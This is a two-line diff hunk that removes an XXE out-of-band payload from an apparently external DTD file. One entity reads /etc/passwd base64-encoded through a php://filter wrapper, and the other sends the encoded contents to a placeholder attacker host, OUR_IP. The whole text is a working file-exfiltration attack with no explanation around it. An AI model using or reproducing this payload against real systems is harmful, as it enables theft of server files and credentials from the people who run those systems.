@@ -1,2 +1,0 @@
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP/index.php?content=%file;'>">
